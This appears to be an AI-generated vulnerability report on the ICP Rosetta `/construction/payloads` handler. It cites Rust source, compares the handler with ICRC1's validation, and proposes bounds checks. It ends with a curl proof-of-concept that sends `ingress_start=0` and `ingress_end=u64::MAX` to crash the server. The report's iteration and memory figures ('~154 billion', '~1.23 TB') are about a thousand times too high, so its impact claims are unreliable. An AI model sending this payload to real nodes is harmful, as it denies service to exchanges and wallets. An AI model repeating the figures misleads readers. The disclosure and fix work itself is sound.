Based on my analysis of the code, here is my determination:

---

### Title
Unbounded `ingress_expiries` Vec Allocation via Attacker-Controlled `ingress_start`/`ingress_end` in ICP Rosetta `/construction/payloads` — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

### Summary

The ICP Rosetta `construction_payloads` handler accepts arbitrary `ingress_start` and `ingress_end` values from the request metadata with no bounds validation before entering a `while` loop that allocates one `u64` per iteration. An unauthenticated client can set `ingress_start=0` and `ingress_end=u64::MAX`, causing ~154 billion loop iterations and ~1.23 TB of attempted heap allocation, crashing the Rosetta server process.

### Finding Description

The loop at lines 99–107 of `construction_payloads.rs`:

```rust
let mut ingress_expiries = vec![];
let mut now = ingress_start;
while now < ingress_end {
    ingress_expiries.push(ingress_expiry);
    now += interval;
}
``` [1](#0-0) 

uses `ingress_start` and `ingress_end` derived directly from the caller-supplied metadata:

```rust
let ingress_start = meta.as_ref().and_then(|meta| meta.ingress_start)
    .map(ic_types::time::Time::from_nanos_since_unix_epoch)
    .unwrap_or_else(ic_types::time::current_time);

let ingress_end = meta.as_ref().and_then(|meta| meta.ingress_end)
    .map(ic_types::time::Time::from_nanos_since_unix_epoch)
    .unwrap_or_else(|| ingress_start + interval);
``` [2](#0-1) 

The `ConstructionPayloadsRequestMetadata` struct accepts raw `Option<u64>` for both fields with no validation: [3](#0-2) 

The `TryFrom<ObjectMap>` implementation is a plain `serde_json::from_value` with no range checks: [4](#0-3) 

The `interval` is `MAX_INGRESS_TTL(300s) - PERMITTED_DRIFT(60s) - 120s = 120s = 120,000,000,000 ns`: [5](#0-4) [6](#0-5) 

With `ingress_start=0` and `ingress_end=18446744073709551615`, the loop runs `u64::MAX / 120_000_000_000 ≈ 153,722,867,280` iterations, each pushing 8 bytes, totaling ~1.23 TB of attempted allocation.

**Contrast with ICRC1 Rosetta**, which has explicit guards before its equivalent loop:

```rust
if ingress_start >= ingress_end {
    return Err(...);
}
if ingress_end < now + ingress_interval {
    return Err(...);
}
``` [7](#0-6) 

The ICP Rosetta handler has no such guards.

### Impact Explanation

A single unauthenticated HTTP POST to `/construction/payloads` with the malicious metadata causes the Rosetta server process to OOM-crash. This takes down the ICP Rosetta node entirely, denying service to all users relying on it for ledger interaction (exchanges, wallets, custodians).

### Likelihood Explanation

The endpoint is publicly reachable with no authentication. The payload is a small JSON object. A single request is sufficient to trigger the crash. The missing validation is a straightforward oversight compared to the ICRC1 sibling implementation which already has the fix pattern.

### Recommendation

Add a window-size cap before the loop, mirroring the ICRC1 Rosetta pattern:

```rust
if ingress_start >= ingress_end {
    return Err(ApiError::invalid_request("ingress_start must be before ingress_end"));
}
let max_window = interval * MAX_REASONABLE_EXPIRY_COUNT; // e.g., 100 intervals
if ingress_end - ingress_start > max_window.as_nanos() as u64 {
    return Err(ApiError::invalid_request("ingress window too large"));
}
```

### Proof of Concept

```bash
curl -X POST http://<rosetta-host>:8080/construction/payloads \
  -H 'Content-Type: application/json' \
  -d '{
    "network_identifier": {"blockchain":"Internet Computer","network":"00000000000000020101"},
    "operations": [{"operation_identifier":{"index":0},"type":"TRANSACTION","account":{"address":"..."},"amount":{"value":"-1","currency":{"symbol":"ICP","decimals":8}}}],
    "public_keys": [{"hex_bytes":"...","curve_type":"edwards25519"}],
    "metadata": {
      "ingress_start": 0,
      "ingress_end": 18446744073709551615
    }
  }'
```

The server process will exhaust heap memory and crash (OOM kill or panic on `Vec::push` allocation failure).

### Citations

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L59-60)
```rust
        let interval =
            ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L74-84)
```rust
        let ingress_start = meta
            .as_ref()
            .and_then(|meta| meta.ingress_start)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(ic_types::time::current_time);

        let ingress_end = meta
            .as_ref()
            .and_then(|meta| meta.ingress_end)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| ingress_start + interval);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L99-107)
```rust
        let mut ingress_expiries = vec![];
        let mut now = ingress_start;
        while now < ingress_end {
            let ingress_expiry = (now
                + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
            .as_nanos_since_unix_epoch();
            ingress_expiries.push(ingress_expiry);
            now += interval;
        }
```

**File:** rs/rosetta-api/icp/src/models.rs (L200-223)
```rust
#[derive(Clone, Eq, PartialEq, Debug, Default, Deserialize, Serialize)]
pub struct ConstructionPayloadsRequestMetadata {
    /// The memo to use for a ledger transfer.
    /// A random number is used by default.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub memo: Option<u64>,

    /// The earliest acceptable expiry date for a ledger transfer.
    /// Must be within 24 hours from created_at_time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ingress_start: Option<u64>,

    /// The latest acceptable expiry date for a ledger transfer.
    /// Must be within 24 hours from created_at_time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ingress_end: Option<u64>,

    /// If present, overrides ledger transaction creation time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub created_at_time: Option<u64>,
}
```

**File:** rs/rosetta-api/icp/src/models.rs (L240-248)
```rust
impl TryFrom<ObjectMap> for ConstructionPayloadsRequestMetadata {
    type Error = ApiError;
    fn try_from(o: ObjectMap) -> Result<Self, ApiError> {
        serde_json::from_value(serde_json::Value::Object(o)).map_err(|e| {
            ApiError::internal_error(format!(
                "Could not parse ConstructionPayloadsRequestMetadata from Object: {e}"
            ))
        })
    }
```

**File:** rs/limits/src/lib.rs (L17-21)
```rust
pub const MAX_INGRESS_TTL: Duration = Duration::from_secs(5 * 60); // 5 minutes

/// Duration subtracted from `MAX_INGRESS_TTL` by
/// `expiry_time_from_now()` when creating an ingress message.
pub const PERMITTED_DRIFT: Duration = Duration::from_secs(60);
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L148-158)
```rust
    if ingress_start >= ingress_end {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress start should start before ingress end: Start: {ingress_start}, End: {ingress_end}"
        )));
    }

    if ingress_end < now + ingress_interval {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress end should be at least one interval from the current time: Current time: {now}, End: {ingress_end}"
        )));
    }
```
